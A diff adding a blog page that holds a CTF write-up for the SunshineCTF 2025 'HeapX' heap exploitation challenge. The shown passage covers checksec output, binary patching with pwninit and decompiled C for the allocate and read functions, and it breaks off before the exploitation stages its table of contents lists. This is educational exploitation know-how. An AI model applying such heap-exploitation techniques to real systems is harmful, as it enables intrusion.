+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/D3LET3-57"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://x.com/D3LET3_57"
+          target="_blank"
+          aria-label="Twitter"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#-table-of-contents">📋 Table of Contents</a></li>
+    <li><a href="#-challenge-overview">🎯 Challenge Overview</a>
+      <ul>
+        <li><a href="#challenge-information">Challenge Information</a></li>
+        <li><a href="#challenge-description">Challenge Description</a></li>
+        <li><a href="#files-provided">Files Provided</a></li>
+      </ul>
+    </li>
+    <li><a href="#-binary-analysis--reverse-engineering">🔍 Binary Analysis &amp; Reverse Engineering</a>
+      <ul>
+        <li><a href="#security-mitigations-analysis">Security Mitigations Analysis</a>
+          <ul>
+            <li><a href="#security-features-breakdown">Security Features Breakdown:</a></li>
+          </ul>
+        </li>
+        <li><a href="#binary-patching-process">Binary Patching Process</a></li>
+        <li><a href="#program-structure-analysis">Program Structure Analysis</a></li>
+        <li><a href="#data-structures">Data Structures</a></li>
+      </ul>
+    </li>
+    <li><a href="#-binary-analysis--reverse-engineering-1">🔧 Binary Analysis &amp; Reverse Engineering</a>
+      <ul>
+        <li><a href="#function-1-allocate-create">Function 1: Allocate (<code>create</code>)</a></li>
+        <li><a href="#function-2-read-read_data">Function 2: Read (<code>read_data</code>)</a></li>
+        <li><a href="#function-3-write-write">Function 3: Write (<code>write</code>)</a></li>
+        <li><a href="#function-4-delete-delete">Function 4: Delete (<code>delete</code>)</a></li>
+        <li><a href="#program-exit-handler">Program Exit Handler</a></li>
+      </ul>
+    </li>
+    <li><a href="#-vulnerability-assessment">🚨 Vulnerability Assessment</a>
+      <ul>
+        <li><a href="#primary-vulnerability-use-after-free-uaf">Primary Vulnerability: Use-After-Free (UAF)</a></li>
+        <li><a href="#secondary-vulnerabilities">Secondary Vulnerabilities</a></li>
+      </ul>
+    </li>
+    <li><a href="#-heap-exploitation-fundamentals">🧠 Heap Exploitation Fundamentals</a>
+      <ul>
+        <li><a href="#modern-heap-security-features">Modern Heap Security Features</a>
+          <ul>
+            <li><a href="#1-safe-linking-glibc--232">1. Safe Linking (glibc ≥ 2.32)</a></li>
+            <li><a href="#2-tcache-thread-local-cache">2. Tcache (Thread Local Cache)</a></li>
+            <li><a href="#3-heap-layout-understanding">3. Heap Layout Understanding</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#-step-by-step-exploitation">🎯 Step-by-Step Exploitation</a>
+      <ul>
+        <li><a href="#exploitation-strategy-overview">Exploitation Strategy Overview</a></li>
+        <li><a href="#stage-1-heap-address-leak">Stage 1: Heap Address Leak</a></li>
+        <li><a href="#stage-2-libc-address-leak">Stage 2: Libc Address Leak</a></li>
+        <li><a href="#stage-3-stack-address-leak">Stage 3: Stack Address Leak</a></li>
+        <li><a href="#stage-4-pie-base-address-leak">Stage 4: PIE Base Address Leak</a></li>
+        <li><a href="#stage-5-rop-chain-construction">Stage 5: ROP Chain Construction</a></li>
+        <li><a href="#stage-6-memory-cleanup">Stage 6: Memory Cleanup</a></li>
+      </ul>
+    </li>
+    <li><a href="#-advanced-concepts-explained">🎓 Advanced Concepts Explained</a>
+      <ul>
+        <li><a href="#safe-linking-deep-dive">Safe Linking Deep Dive</a></li>
+        <li><a href="#tcache-vs-fastbin-differences">Tcache vs Fastbin Differences</a></li>
+        <li><a href="#aslr-and-pie-interaction">ASLR and PIE Interaction</a></li>
+        <li><a href="#rop-chain-design-principles">ROP Chain Design Principles</a></li>
+      </ul>
+    </li>
+    <li><a href="#-code-analysis">💻 Code Analysis</a>
+      <ul>
+        <li><a href="#complete-exploit-script-analysis">Complete Exploit Script Analysis</a></li>
+        <li><a href="#key-implementation-details">Key Implementation Details</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#-table-of-contents">📋 Table of Contents</a></li>
+    <li><a href="#-challenge-overview">🎯 Challenge Overview</a>
+      <ul>
+        <li><a href="#challenge-information">Challenge Information</a></li>
+        <li><a href="#challenge-description">Challenge Description</a></li>
+        <li><a href="#files-provided">Files Provided</a></li>
+      </ul>
+    </li>
+    <li><a href="#-binary-analysis--reverse-engineering">🔍 Binary Analysis &amp; Reverse Engineering</a>
+      <ul>
+        <li><a href="#security-mitigations-analysis">Security Mitigations Analysis</a>
+          <ul>
+            <li><a href="#security-features-breakdown">Security Features Breakdown:</a></li>
+          </ul>
+        </li>
+        <li><a href="#binary-patching-process">Binary Patching Process</a></li>
+        <li><a href="#program-structure-analysis">Program Structure Analysis</a></li>
+        <li><a href="#data-structures">Data Structures</a></li>
+      </ul>
+    </li>
+    <li><a href="#-binary-analysis--reverse-engineering-1">🔧 Binary Analysis &amp; Reverse Engineering</a>
+      <ul>
+        <li><a href="#function-1-allocate-create">Function 1: Allocate (<code>create</code>)</a></li>
+        <li><a href="#function-2-read-read_data">Function 2: Read (<code>read_data</code>)</a></li>
+        <li><a href="#function-3-write-write">Function 3: Write (<code>write</code>)</a></li>
+        <li><a href="#function-4-delete-delete">Function 4: Delete (<code>delete</code>)</a></li>
+        <li><a href="#program-exit-handler">Program Exit Handler</a></li>
+      </ul>
+    </li>
+    <li><a href="#-vulnerability-assessment">🚨 Vulnerability Assessment</a>
+      <ul>
+        <li><a href="#primary-vulnerability-use-after-free-uaf">Primary Vulnerability: Use-After-Free (UAF)</a></li>
+        <li><a href="#secondary-vulnerabilities">Secondary Vulnerabilities</a></li>
+      </ul>
+    </li>
+    <li><a href="#-heap-exploitation-fundamentals">🧠 Heap Exploitation Fundamentals</a>
+      <ul>
+        <li><a href="#modern-heap-security-features">Modern Heap Security Features</a>
+          <ul>
+            <li><a href="#1-safe-linking-glibc--232">1. Safe Linking (glibc ≥ 2.32)</a></li>
+            <li><a href="#2-tcache-thread-local-cache">2. Tcache (Thread Local Cache)</a></li>
+            <li><a href="#3-heap-layout-understanding">3. Heap Layout Understanding</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#-step-by-step-exploitation">🎯 Step-by-Step Exploitation</a>
+      <ul>
+        <li><a href="#exploitation-strategy-overview">Exploitation Strategy Overview</a></li>
+        <li><a href="#stage-1-heap-address-leak">Stage 1: Heap Address Leak</a></li>
+        <li><a href="#stage-2-libc-address-leak">Stage 2: Libc Address Leak</a></li>
+        <li><a href="#stage-3-stack-address-leak">Stage 3: Stack Address Leak</a></li>
+        <li><a href="#stage-4-pie-base-address-leak">Stage 4: PIE Base Address Leak</a></li>
+        <li><a href="#stage-5-rop-chain-construction">Stage 5: ROP Chain Construction</a></li>
+        <li><a href="#stage-6-memory-cleanup">Stage 6: Memory Cleanup</a></li>
+      </ul>
+    </li>
+    <li><a href="#-advanced-concepts-explained">🎓 Advanced Concepts Explained</a>
+      <ul>
+        <li><a href="#safe-linking-deep-dive">Safe Linking Deep Dive</a></li>
+        <li><a href="#tcache-vs-fastbin-differences">Tcache vs Fastbin Differences</a></li>
+        <li><a href="#aslr-and-pie-interaction">ASLR and PIE Interaction</a></li>
+        <li><a href="#rop-chain-design-principles">ROP Chain Design Principles</a></li>
+      </ul>
+    </li>
+    <li><a href="#-code-analysis">💻 Code Analysis</a>
+      <ul>
+        <li><a href="#complete-exploit-script-analysis">Complete Exploit Script Analysis</a></li>
+        <li><a href="#key-implementation-details">Key Implementation Details</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+<h1 class="relative group">SunshineCTF 2025 - HeapX Challenge: Complete Technical Analysis and Exploitation Guide 
+    <div id="sunshinectf-2025---heapx-challenge-complete-technical-analysis-and-exploitation-guide" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#sunshinectf-2025---heapx-challenge-complete-technical-analysis-and-exploitation-guide" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+
+
+<h2 class="relative group">📋 Table of Contents 
+    <div id="-table-of-contents" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#-table-of-contents" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ol>
+<li><a href="#challenge-overview">Challenge Overview</a></li>
+<li><a href="#binary-analysis--reverse-engineering">Binary Analysis &amp; Reverse Engineering</a></li>
+<li><a href="#vulnerability-assessment">Vulnerability Assessment</a></li>
+<li><a href="#heap-exploitation-fundamentals">Heap Exploitation Fundamentals</a></li>
+<li><a href="#step-by-step-exploitation">Step-by-Step Exploitation</a></li>
+<li><a href="#advanced-concepts-explained">Advanced Concepts Explained</a></li>
+<li><a href="#code-analysis">Code Analysis</a></li>
+<li><a href="#conclusion--key-takeaways">Conclusion &amp; Key Takeaways</a></li>
+</ol>
+<hr>
+
+
+<h2 class="relative group">🎯 Challenge Overview 
+    <div id="-challenge-overview" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#-challenge-overview" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">Challenge Information 
+    <div id="challenge-information" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#challenge-information" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li><strong>Name:</strong> HeapX</li>
+<li><strong>Category:</strong> PWN (Binary Exploitation)</li>
+<li><strong>Difficulty:</strong> Medium-Hard</li>
+<li><strong>Author:</strong> Oreomeister</li>
+<li><strong>CTF:</strong> SunshineCTF 2025</li>
+</ul>
+
+
+<h3 class="relative group">Challenge Description 
+    <div id="challenge-description" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#challenge-description" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<blockquote>
+<p>HeapX<br>
+Oreomeister<br>
+We discovered the Falcon 9 rocket&rsquo;s log aggregator, HeapX, can you pwn it and take control before it reaches orbit?</p>
+</blockquote>
+
+
+<h3 class="relative group">Files Provided 
+    <div id="files-provided" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#files-provided" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li><code>heapx</code> - Main binary executable</li>
+<li><code>libc.so.6</code> - Custom libc library (version 2.35)</li>
+<li><code>ld-linux-x86-64.so.2</code> - Dynamic linker</li>
+<li>Additional files: IDA database files (<code>.id0</code>, <code>.id1</code>, <code>.id2</code>, <code>.nam</code>, <code>.til</code>)</li>
+</ul>
+<hr>
+
+
+<h2 class="relative group">🔍 Binary Analysis &amp; Reverse Engineering 
+    <div id="-binary-analysis--reverse-engineering" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#-binary-analysis--reverse-engineering" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">Security Mitigations Analysis 
+    <div id="security-mitigations-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#security-mitigations-analysis" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ checksec heapx
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span><span class="line"><span class="cl">    RUNPATH:  b<span class="s1">&#39;.&#39;</span>
+</span></span></code></pre></div>
+
+<h4 class="relative group">Security Features Breakdown: 
+    <div id="security-features-breakdown" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#security-features-breakdown" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<ol>
+<li>
+<p><strong>Full RELRO (RELocation Read-Only)</strong></p>
+<ul>
+<li>Global Offset Table (GOT) is read-only after initialization</li>
+<li>Prevents GOT overwrite attacks</li>
+<li>Makes traditional ret2libc harder</li>
+</ul>
+</li>
+<li>
+<p><strong>Stack Canary</strong></p>
+<ul>
+<li>Stack buffer overflow protection</li>
+<li>Random canary value placed before return address</li>
+<li>Detects stack corruption</li>
+</ul>
+</li>
+<li>
+<p><strong>NX (No eXecute)</strong></p>
+<ul>
+<li>Stack and heap are non-executable</li>
+<li>Prevents shellcode injection</li>
+<li>Forces use of ROP/JOP techniques</li>
+</ul>
+</li>
+<li>
+<p><strong>PIE (Position Independent Executable)</strong></p>
+<ul>
+<li>Base address randomized at runtime</li>
+<li>Requires address leaks for reliable exploitation</li>
+<li>Combined with ASLR makes exploitation harder</li>
+</ul>
+</li>
+<li>
+<p><strong>RUNPATH Setting</strong></p>
+<ul>
+<li>Forces loading of provided libc instead of system libc</li>
+<li>Ensures consistent exploitation environment</li>
+</ul>
+</li>
+</ol>
+
+
+<h3 class="relative group">Binary Patching Process 
+    <div id="binary-patching-process" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#binary-patching-process" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The challenge requires patching the binary to use the provided libc:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Using pwninit for automatic patching</span>
+</span></span><span class="line"><span class="cl">$ pwninit --bin heapx --libc libc.so.6 --ld ld-linux-x86-64.so.2
+</span></span></code></pre></div><p>This creates <code>heapx_patched</code> with correct library dependencies.</p>
+
+
+<h3 class="relative group">Program Structure Analysis 
+    <div id="program-structure-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#program-structure-analysis" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The binary implements a menu-driven heap management system with five main functions:</p>
+<pre tabindex="0"><code>1. Allocate - Create new log entry
+2. Read     - Display log content
+3. Write    - Modify log content
+4. Delete   - Remove log entry
+5. Exit     - Terminate program
+</code></pre>
+
+<h3 class="relative group">Data Structures 
+    <div id="data-structures" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#data-structures" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The program maintains two global arrays:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span><span class="o">*</span> <span class="n">ptr_table</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>    <span class="c1">// Stores pointers to allocated chunks
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="n">size_table</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>     <span class="c1">// Stores sizes of allocated chunks
+</span></span></span></code></pre></div><hr>
+
+
+<h2 class="relative group">🔧 Binary Analysis &amp; Reverse Engineering 
+    <div id="-binary-analysis--reverse-engineering-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#-binary-analysis--reverse-engineering-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">Function 1: Allocate (<code>create</code>) 
+    <div id="function-1-allocate-create" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#function-1-allocate-create" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">create</span><span class="p">(</span><span class="kt">int</span> <span class="n">index</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">1279</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ptr</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ptr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[INFO] Creating new log...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ptr_table</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>           <span class="c1">// Store pointer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">size_table</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>         <span class="c1">// Store size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[ERROR] Invalid size!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>Key Points:</strong></p>
+<ul>
+<li>Size validation: 1 ≤ size ≤ 1279</li>
+<li>Uses standard <code>malloc()</code> for allocation</li>
+<li>Stores both pointer and size in global arrays</li>
+<li>No bounds checking on <code>index</code> parameter</li>
+</ul>
+
+
+<h3 class="relative group">Function 2: Read (<code>read_data</code>) 
+    <div id="function-2-read-read_data" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#function-2-read-read_data" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">read_data</span><span class="p">(</span><span class="kt">int</span> <span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>  <span class="c1">// Stack canary
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">ptr_table</span><span class="p">[</span><span class="n">index</span><span class="p">])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">ptr_table</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>  <span class="c1">// Print chunk content
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ERROR] Log #%d doesn&#39;t exist!!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
